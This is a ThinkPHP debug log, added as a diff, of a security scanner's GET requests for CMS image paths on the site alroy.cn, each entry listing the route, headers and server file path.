+[ log ] alroy.cn/app/resource/images/coupon-hd-bg.png [运行时间：0.025969s][吞吐率：38.51req/s] [内存消耗：1,838.56kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'app',
+    1 => 'resource',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:15+08:00 ] 60.205.45.195 140.205.201.41 GET /web/resource/images/bg_repno.gif
+[ log ] alroy.cn/web/resource/images/bg_repno.gif [运行时间：0.026022s][吞吐率：38.43req/s] [内存消耗：1,838.49kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'web',
+    1 => 'resource',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:16+08:00 ] 60.205.45.195 140.205.201.41 GET /resource/image/bg_repno.gif
+[ log ] alroy.cn/resource/image/bg_repno.gif [运行时间：0.026925s][吞吐率：37.14req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'resource',
+    1 => 'image',
+    2 => 'bg_repno.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:16+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/abg2.png
+[ log ] alroy.cn/admin/images/abg2.png [运行时间：0.027260s][吞吐率：36.68req/s] [内存消耗：1,839.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'abg2.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:16+08:00 ] 60.205.45.195 140.205.201.41 GET /face/5.gif
+[ log ] alroy.cn/face/5.gif [运行时间：0.027160s][吞吐率：36.82req/s] [内存消耗：1,838.66kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'face',
+    1 => '5.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:17+08:00 ] 60.205.45.195 140.205.201.41 GET /xin/btn_regis.gif
+[ log ] alroy.cn/xin/btn_regis.gif [运行时间：0.026302s][吞吐率：38.02req/s] [内存消耗：1,838.41kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'xin',
+    1 => 'btn_regis.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:17+08:00 ] 60.205.45.195 140.205.201.41 GET /global/banklist_hnapay.jpg
+[ log ] alroy.cn/global/banklist_hnapay.jpg [运行时间：0.026108s][吞吐率：38.30req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'global',
+    1 => 'banklist_hnapay.jpg',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:17+08:00 ] 60.205.45.195 140.205.201.41 GET /Public/lottery/roulette/images/b0-2.jpg
+[ log ] alroy.cn/Public/lottery/roulette/images/b0-2.jpg [运行时间：0.025420s][吞吐率：39.34req/s] [内存消耗：1,839.27kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Public',
+    1 => 'lottery',
+    2 => 'roulette',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'b0-2.jpg',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:17+08:00 ] 60.205.45.195 140.205.201.41 GET /m/_/images/fileicon/jpg.png
+[ log ] alroy.cn/m/_/images/fileicon/jpg.png [运行时间：0.027849s][吞吐率：35.91req/s] [内存消耗：1,839.13kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'm',
+    1 => '_',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'fileicon' => 'jpg.png',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:18+08:00 ] 60.205.45.195 140.205.201.41 GET /system/images/tab_17.gif
+[ log ] alroy.cn/system/images/tab_17.gif [运行时间：0.024982s][吞吐率：40.03req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'system',
+    1 => 'images',
+    2 => 'tab_17.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:18+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/tab_17.gif
+[ log ] alroy.cn/admin/images/tab_17.gif [运行时间：0.025819s][吞吐率：38.73req/s] [内存消耗：1,839.59kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'tab_17.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:18+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/top_tt_bg.gif
+[ log ] alroy.cn/admin/images/top_tt_bg.gif [运行时间：0.027374s][吞吐率：36.53req/s] [内存消耗：1,839.64kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'top_tt_bg.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:19+08:00 ] 60.205.45.195 140.205.201.41 GET /Public/img/fotorama.png
+[ log ] alroy.cn/Public/img/fotorama.png [运行时间：0.024993s][吞吐率：40.01req/s] [内存消耗：1,838.52kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Public',
+    1 => 'img',
+    2 => 'fotorama.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:19+08:00 ] 60.205.45.195 140.205.201.41 GET /data/system/kaixin001.gif
+[ log ] alroy.cn/data/system/kaixin001.gif [运行时间：0.026868s][吞吐率：37.22req/s] [内存消耗：1,838.53kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'data',
+    1 => 'system',
+    2 => 'kaixin001.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:19+08:00 ] 60.205.45.195 140.205.201.41 GET /data/captcha/gif/Small_Fonts/3.gif
+[ log ] alroy.cn/data/captcha/gif/Small_Fonts/3.gif [运行时间：0.031842s][吞吐率：31.41req/s] [内存消耗：1,839.09kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'data',
+    1 => 'captcha',
+    2 => 'gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'Small_Fonts' => '3.gif',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:20+08:00 ] 60.205.45.195 140.205.201.41 GET /inc_img/vote/vote2_1.gif
+[ log ] alroy.cn/inc_img/vote/vote2_1.gif [运行时间：0.026100s][吞吐率：38.31req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'inc_img',
+    1 => 'vote',
+    2 => 'vote2_1.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:20+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/login/login_submit.gif
+[ log ] alroy.cn/admin/images/login/login_submit.gif [运行时间：0.026862s][吞吐率：37.23req/s] [内存消耗：1,839.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:20+08:00 ] 60.205.45.195 140.205.201.41 GET /i5808/images/menu_reduce.gif
+[ log ] alroy.cn/i5808/images/menu_reduce.gif [运行时间：0.026460s][吞吐率：37.79req/s] [内存消耗：1,838.66kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'i5808',
+    1 => 'images',
+    2 => 'menu_reduce.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:21+08:00 ] 60.205.45.195 140.205.201.41 GET /skins/images/ico_catalogue.png
+[ log ] alroy.cn/skins/images/ico_catalogue.png [运行时间：0.025771s][吞吐率：38.80req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'skins',
+    1 => 'images',
+    2 => 'ico_catalogue.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:21+08:00 ] 60.205.45.195 140.205.201.41 GET /images/logout1.png
+[ log ] alroy.cn/images/logout1.png [运行时间：0.026391s][吞吐率：37.89req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'logout1.png',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:21+08:00 ] 60.205.45.195 140.205.201.41 GET /forum/images/logout1.png
+[ log ] alroy.cn/forum/images/logout1.png [运行时间：0.028033s][吞吐率：35.67req/s] [内存消耗：1,838.50kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'forum',
+    1 => 'images',
+    2 => 'logout1.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:21+08:00 ] 60.205.45.195 140.205.201.41 GET /images/common/online_admin.gif
+[ log ] alroy.cn/images/common/online_admin.gif [运行时间：0.027014s][吞吐率：37.02req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'common',
+    2 => 'online_admin.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:22+08:00 ] 60.205.45.195 140.205.201.41 GET /images/rank/soso.gif
+[ log ] alroy.cn/images/rank/soso.gif [运行时间：0.027164s][吞吐率：36.81req/s] [内存消耗：1,838.64kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'rank',
+    2 => 'soso.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:22+08:00 ] 60.205.45.195 140.205.201.41 GET /console/images/bg11.jpg
+[ log ] alroy.cn/console/images/bg11.jpg [运行时间：0.027974s][吞吐率：35.75req/s] [内存消耗：1,838.69kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'console',
+    1 => 'images',
+    2 => 'bg11.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:22+08:00 ] 60.205.45.195 140.205.201.41 GET /console/images/login.gif
+[ log ] alroy.cn/console/images/login.gif [运行时间：0.024707s][吞吐率：40.47req/s] [内存消耗：1,838.73kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'console',
+    1 => 'images',
+    2 => 'login.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:23+08:00 ] 60.205.45.195 140.205.201.41 GET /Admincp/images/login_r2_c2_r1_c4.jpg
+[ log ] alroy.cn/Admincp/images/login_r2_c2_r1_c4.jpg [运行时间：0.025099s][吞吐率：39.84req/s] [内存消耗：1,838.61kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Admincp',
+    1 => 'images',
+    2 => 'login_r2_c2_r1_c4.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:23+08:00 ] 60.205.45.195 140.205.201.41 GET /statics/delivertitle.gif
+[ log ] alroy.cn/statics/delivertitle.gif [运行时间：0.026687s][吞吐率：37.47req/s] [内存消耗：1,838.53kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'statics',
+    1 => 'delivertitle.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:23+08:00 ] 60.205.45.195 140.205.201.41 GET /images/default/shopexstorelogo.jpg
+[ log ] alroy.cn/images/default/shopexstorelogo.jpg [运行时间：0.028317s][吞吐率：35.31req/s] [内存消耗：1,838.58kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'default',
+    2 => 'shopexstorelogo.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:24+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/netgather_com.gif
+[ log ] alroy.cn/admin/images/netgather_com.gif [运行时间：0.027931s][吞吐率：35.80req/s] [内存消耗：1,839.59kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'netgather_com.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:24+08:00 ] 60.205.45.195 140.205.201.41 GET /cn/images/banner_page_bg.gif
